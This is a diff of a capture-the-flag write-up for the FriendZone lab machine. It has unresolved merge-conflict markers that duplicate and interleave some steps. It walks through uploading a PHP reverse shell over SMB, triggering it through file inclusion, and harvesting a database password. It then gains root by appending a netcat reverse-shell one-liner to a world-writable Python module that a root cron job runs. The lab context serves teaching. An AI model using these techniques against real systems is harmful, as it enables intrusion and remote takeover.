@@ -399,20 +399,161 @@ smbclient \\\\10.10.10.123\\Development -U admin
 
 Password for [WORKGROUP\admin]:
 Try "help" to get a list of possible commands.
+<<<<<<< HEAD
 smb: \> put php-reverse-shell.php
 putting file php-reverse-shell.php as \php-reverse-shell.php (107.3 kb/s) (average 107.3 kb/s)
+=======
+smb: \> put r_shell
+putting file php-reverse-shell as \php-reverse-shell (1.0 kb/s) (average 1.0 kb/s)
+>>>>>>> main
 smb: \> 
 
+```
+
+
+**Start Netcat Listener**
+```
+nc -nlvp 1234
 ```
 
 **Execute Reverse Shell**
 
 ```
+<<<<<<< HEAD
 https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell.php
+=======
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
+```
+
+**Shell Acquired**
+```
+nc -nlvp 1234
+
+listening on [any] 1234 ...cd /
+connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36522
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 04:01:36 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+### Get User Flag
+
+First we need to stabilize the shell
+
+1. Escape limited shell
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+2. Give access to `clear` command and more
+```
+export TERM=xterm
+```
+
+3. Then background the shell with CTRL+Z
+
+4. In your terminal, use the command below.
+```
+stty raw -echo; fg
+```
+
+Flag is ==f61334c76f61015bf617a7410732063b==
+```
+www-data@FriendZone:/$ find /home/friend -name *.txt 2>/dev/null
+/home/friend/user.txt
+www-data@FriendZone:/$ cat /home/friend/user.txt 
+f61334c76f61015bf617a7410732063b
+www-data@FriendZone:/$ 
+
+```
+
+### User Password
+
+I used the hint to find the password. However, you can also execute the following to find it
+```
+find / -name "*.conf" -exec grep -Hi pass {} \; 2>/dev/null
+```
+
+Password is located in `/var/www/mysql_data.conf`
+```
+db_pass=Agpyu12!0.213$
+```
+
+In that config file we'll find the database user and the db they can log into:
+
+```
+www-data@FriendZone:/$ cat /var/www/mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+www-data@FriendZone:/$ 
+```
+
+### Root Flag 
+
+Look for files with 777 permissions
+
+Command
+```
+find / -type f -perm -0777 -ls 2>/dev/null
+
+20473     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py
+
+```
+
+We find a python script - os.py. This python script is owned by root but anyone can execute it. 
+
+The os python script is a module that allows for system interaction. 
+
+Enumerate processes and cron jobs
+```
+ps auxwf | grep cron
+
+root        404  0.0  0.3  31320  3172 ?        Ss   Jan24   0:00 /usr/sbin/cron -f
+friend    18204  0.0  0.1  14428  1004 pts/0    S+   02:21   0:00  | 
+```
+
+Download the `pspy64` script and put it in the Development directory
+
+Execute it on the target machine
+![[Pasted image 20240124203830.png]]
+
+A python script `/opt/server_admin/reporter.py` is being executed by root via a cron job. It is also importing the os module we previously discovered that can be run by everyone.
+
+Append the below reverse shell one liner to the end of the os.py file. When cron executes this file, we will gain root access. Why? Because the reporter.py script is ran with root privileges.
+
+```
+echo "system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46 8000 >/tmp/f')" >> /usr/lib/python2.7/os.py
+>>>>>>> main
 ```
 
 
+```
+nc -nlvp 8000
+
+<<<<<<< HEAD
 
 
 
-
+=======
+listening on [any] 8000 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.10.10.123] 36112
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -l
+total 8
+drwxr-xr-x 2 root root 4096 Sep 13  2022 certs
+-rw-r----- 1 root root   33 Jan 24 02:57 root.txt
+# cat root.txt
+9d86a176fc4273ea6a02299398222c84
+# 
+```
+>>>>>>> main
